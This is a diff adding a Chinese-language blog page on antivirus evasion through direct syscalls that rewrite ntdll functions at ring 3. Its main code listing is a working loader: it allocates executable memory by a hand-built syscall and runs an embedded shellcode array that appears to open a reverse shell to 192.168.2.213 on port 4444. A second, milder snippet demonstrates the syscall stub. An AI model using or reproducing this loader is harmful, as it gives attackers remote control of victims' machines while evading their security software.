@@ -1,0 +1,702 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="简介r3 层重写函数的主要目的就是为了隐藏api 的调用 由于杀毒软件会对重要的dll 进行一个hook 添加一个消息机制 只要调用了某一个函数，就会发送消息到杀软上，如果这个时候我们利用自己的手法进行重写某一些函数调用过程，那么也就可以相对来说避免了一些特征 前情提要ntdll ntdll.dll 是 Windows 操作系统中的一个关键系统文件，它包含了许多低级别的操作系统功能。这个动态链接库">
+<meta property="og:type" content="article">
+<meta property="og:title" content="r3层函数重写">
+<meta property="og:url" content="https://tsy244.github.io/2025/01/11/%E5%85%8D%E6%9D%80/r3%E5%B1%82%E5%87%BD%E6%95%B0%E9%87%8D%E5%86%99/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="简介r3 层重写函数的主要目的就是为了隐藏api 的调用 由于杀毒软件会对重要的dll 进行一个hook 添加一个消息机制 只要调用了某一个函数，就会发送消息到杀软上，如果这个时候我们利用自己的手法进行重写某一些函数调用过程，那么也就可以相对来说避免了一些特征 前情提要ntdll ntdll.dll 是 Windows 操作系统中的一个关键系统文件，它包含了许多低级别的操作系统功能。这个动态链接库">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%85%8D%E6%9D%80/image-20250112113513260.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%85%8D%E6%9D%80/image-20250112113609471.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%85%8D%E6%9D%80/image-20250112114533325.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%85%8D%E6%9D%80/image-20250112114638350.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%85%8D%E6%9D%80/image-20250112114758653.png">
+<meta property="article:published_time" content="2025-01-11T07:42:59.000Z">
+<meta property="article:modified_time" content="2025-01-12T03:56:47.313Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%85%8D%E6%9D%80/image-20250112113513260.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>r3层函数重写 - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="r3层函数重写"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-01-11 15:42" pubdate>
+          January 11, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.7k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          48 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">r3层函数重写</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>r3 层重写函数的主要目的就是为了隐藏api 的调用</p>
+<p>由于杀毒软件会对重要的dll 进行一个hook 添加一个消息机制</p>
+<p>只要调用了某一个函数，就会发送消息到杀软上，如果这个时候我们利用自己的手法进行重写某一些函数调用过程，那么也就可以相对来说避免了一些特征</p>
+<h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h1><h2 id="ntdll"><a href="#ntdll" class="headerlink" title="ntdll"></a>ntdll</h2><blockquote>
+<p><code>ntdll.dll</code> 是 Windows 操作系统中的一个关键系统文件，它包含了许多低级别的操作系统功能。这个动态链接库（DLL）是用户模式下最重要的系统组件之一，为应用程序和其它系统 DLL 提供了访问核心操作系统服务的接口。</p>
+</blockquote>
+<h2 id="VirtualAlloc"><a href="#VirtualAlloc" class="headerlink" title="VirtualAlloc"></a>VirtualAlloc</h2><p>可以先简单的尝试分析一下VirtualAlloc 的调用过程</p>
+<ol>
+<li><p>明确VirtualAlloc 存在于哪个dll</p>
+<p>可以通过微软官方的提供的一个文档进行查询</p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc 函数 （memoryapi.h） - Win32 apps | Microsoft Learn</a></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%85%8D%E6%9D%80/image-20250112113513260.png" srcset="/img/loading.gif" lazyload alt="image-20250112113513260"></p>
+</li>
+<li><p>知道dll 之后，看函数的逻辑</p>
+<p>将kernel32.dll 直接拖入ida</p>
+<p>找到导出表之后，通过搜寻virtualAlloc</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%85%8D%E6%9D%80/image-20250112113609471.png" srcset="/img/loading.gif" lazyload alt="image-20250112113609471"></p>
+<p>但是kernel32.dll 最终获取的一个函数，都是从kernelbase 中进行获取的</p>
+</li>
+<li><p>Kernelbase.dll</p>
+<p>找到kenel32.dll 之后就会发现还调用了其他的函数</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%85%8D%E6%9D%80/image-20250112114533325.png" srcset="/img/loading.gif" lazyload alt="image-20250112114533325"></p>
+<p>最后这个函数在导入表中，尝试对导入表进行分析</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%85%8D%E6%9D%80/image-20250112114638350.png" srcset="/img/loading.gif" lazyload alt="image-20250112114638350"></p>
+<p>存在于ntdll</p>
+<p>那么直接看这个dll 中的内容</p>
+</li>
+<li><p>n tdll</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%85%8D%E6%9D%80/image-20250112114758653.png" srcset="/img/loading.gif" lazyload alt="image-20250112114758653"></p>
+<p>可以发现其实就两个方式进行调用，是否支持syscall 的方式</p>
+<p>如果支持就直接走syscall 进行调用</p>
+<p>不支持就走中断的方式</p>
+</li>
+</ol>
+<h1 id="ntdll-重写的r3层"><a href="#ntdll-重写的r3层" class="headerlink" title="ntdll 重写的r3层"></a>ntdll 重写的r3层</h1><p><a target="_blank" rel="noopener" href="https://gitee.com/cutecuteyu/r3-rewrite-function/blob/master/%E6%BA%90.cpp#">源.cpp · cutecuteyu&#x2F;r3重写函数 - 码云 - 开源中国 (gitee.com)</a></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/section:.data,RWE&quot;</span>)<span class="hljs-comment">//.dataοִ</span></span><br><br>CHAR FuncExample[] = &#123;<br>	<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0xd1</span>,			  <span class="hljs-comment">//mov r10,rcx</span><br>	<span class="hljs-number">0xb8</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>, <span class="hljs-comment">//mov eax,018h</span><br>	<span class="hljs-number">0x0f</span>,<span class="hljs-number">0x05</span>,				  <span class="hljs-comment">//syscall</span><br>	<span class="hljs-number">0xc3</span>					  <span class="hljs-comment">//ret</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* pNtAllocateVirtualMemory)</span><span class="hljs-params">(<span class="hljs-comment">//ָ</span></span></span><br><span class="hljs-params"><span class="hljs-function">	HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">	PVOID* BaseAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">	ULONG_PTR ZeroBits,</span></span><br><span class="hljs-params"><span class="hljs-function">	PSIZE_T RegionSize,</span></span><br><span class="hljs-params"><span class="hljs-function">	ULONG AllocationType,</span></span><br><span class="hljs-params"><span class="hljs-function">	ULONG Protect)</span></span>;<br><br><br><span class="hljs-function">DOUBLE <span class="hljs-title">GetAndSetSysCall</span><span class="hljs-params">(TCHAR* szFuncName)</span> </span>&#123;<br>	DWORD SysCallid = <span class="hljs-number">0</span>;<br>	HMODULE hModule = <span class="hljs-built_in">GetModuleHandle</span>(_T(<span class="hljs-string">&quot;ntdll.dll&quot;</span>));<br>	DWORD64 FuncAddr = (DWORD64)<span class="hljs-built_in">GetProcAddress</span>(hModule, (LPCSTR)szFuncName);<br>	LPVOID CallAddr = (LPVOID)(FuncAddr + <span class="hljs-number">4</span>);<br>	<span class="hljs-built_in">ReadProcessMemory</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), CallAddr, &amp;SysCallid, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-built_in">memcpy</span>(FuncExample + <span class="hljs-number">4</span>, (CHAR*)&amp;SysCallid, <span class="hljs-number">2</span>);<br>	<span class="hljs-keyword">return</span> (DOUBLE)SysCallid;<br>&#125;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] =<br><span class="hljs-string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span><br><span class="hljs-string">&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;</span><br><span class="hljs-string">&quot;\x8b\x52\x20\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48\x8b\x72\x50&quot;</span><br><span class="hljs-string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span><br><span class="hljs-string">&quot;\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0&quot;</span><br><span class="hljs-string">&quot;\x41\x51\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span><br><span class="hljs-string">&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b&quot;</span><br><span class="hljs-string">&quot;\x40\x20\x50\x8b\x48\x18\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48&quot;</span><br><span class="hljs-string">&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1&quot;</span><br><span class="hljs-string">&quot;\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;</span><br><span class="hljs-string">&quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;</span><br><span class="hljs-string">&quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span><br><span class="hljs-string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;</span><br><span class="hljs-string">&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span><br><span class="hljs-string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;</span><br><span class="hljs-string">&quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span><br><span class="hljs-string">&quot;\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x02\xd5\x41\x54\x49\x89\xe4&quot;</span><br><span class="hljs-string">&quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;</span><br><span class="hljs-string">&quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;</span><br><span class="hljs-string">&quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span><br><span class="hljs-string">&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;</span><br><span class="hljs-string">&quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;</span><br><span class="hljs-string">&quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;</span><br><span class="hljs-string">&quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span><br><span class="hljs-string">&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;</span><br><span class="hljs-string">&quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;</span><br><span class="hljs-string">&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;</span><br><span class="hljs-string">&quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span><br><span class="hljs-string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span><br><span class="hljs-string">&quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;</span><br><span class="hljs-string">&quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;</span><br><span class="hljs-string">&quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span><br><span class="hljs-string">&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;</span><br><span class="hljs-string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>	LPVOID Address = <span class="hljs-literal">NULL</span>;<br>	SIZE_T uSize = <span class="hljs-built_in">sizeof</span>(buf);<br>	DOUBLE call = <span class="hljs-built_in">GetAndSetSysCall</span>((TCHAR*)<span class="hljs-string">&quot;NtAllocateVirtualMemory&quot;</span>);<br>	pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)&amp;FuncExample;<br>	NTSTATUS status = <span class="hljs-built_in">NtAllocateVirtualMemory</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), &amp;Address, <span class="hljs-number">0</span>, &amp;uSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>	<span class="hljs-built_in">RtlMoveMemory</span>(Address, buf, <span class="hljs-built_in">sizeof</span>(buf));<br>	HANDLE hand = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,(LPTHREAD_START_ROUTINE)Address,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>	<span class="hljs-built_in">WaitForSingleObject</span>(hand,INFINITE);<br><br>	<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="kernel32-的重写"><a href="#kernel32-的重写" class="headerlink" title="kernel32 的重写"></a>kernel32 的重写</h1><p><a target="_blank" rel="noopener" href="https://idiotc4t.com/defense-evasion/overwrite-winapi-bypassav">通过重写ring3 API函数实现免杀 | idiotc4t’s blog</a></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function">EXTERN_C NTSTATUS NTAPI <span class="hljs-title">NtAllocateVirtualMemoryProc</span><span class="hljs-params">(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(NTAPI* pNtAllocateVirtualMemory)</span><span class="hljs-params">(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)</span></span>;<br><span class="hljs-comment">//typedef NTSTATUS (NTAPI* pZwWriteVirtualMemory)(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><br>    pNtAllocateVirtualMemory NtAllocateVirtualMemory = &amp;NtAllocateVirtualMemoryProc;<br>    LPVOID Address = <span class="hljs-literal">NULL</span>;<br>    SIZE_T uSize = <span class="hljs-number">0x1000</span>;<br>    HANDLE hProcess = <span class="hljs-built_in">GetCurrentProcess</span>();<br>    NTSTATUS status = <span class="hljs-built_in">NtAllocateVirtualMemory</span>(hProcess, &amp;Address, <span class="hljs-number">0</span>, &amp;uSize, MEM_COMMIT, PAGE_READWRITE);<br>    <span class="hljs-keyword">if</span> (status != <span class="hljs-number">0</span>) &#123;<br>       <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-type">char</span> a[] = <span class="hljs-string">&quot;hello world\n&quot;</span>;<br>    <span class="hljs-built_in">WriteProcessMemory</span>(hProcess, Address, a, <span class="hljs-built_in">sizeof</span>(a), <span class="hljs-number">0</span>);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>由于这个根本措施是隐藏iat和防止nedll的杀软消息hook</p>
+<p>隐藏iat 更简单的方式就是使用动态调用的方式</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%85%8D%E6%9D%80/">#免杀</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>r3层函数重写</div>
+      <div>https://tsy244.github.io/2025/01/11/免杀/r3层函数重写/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 11, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/12/26/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/AndroidManifest%E6%96%87%E4%BB%B6/" title="AndroidManifest文件">
+                        <span class="hidden-mobile">AndroidManifest文件</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
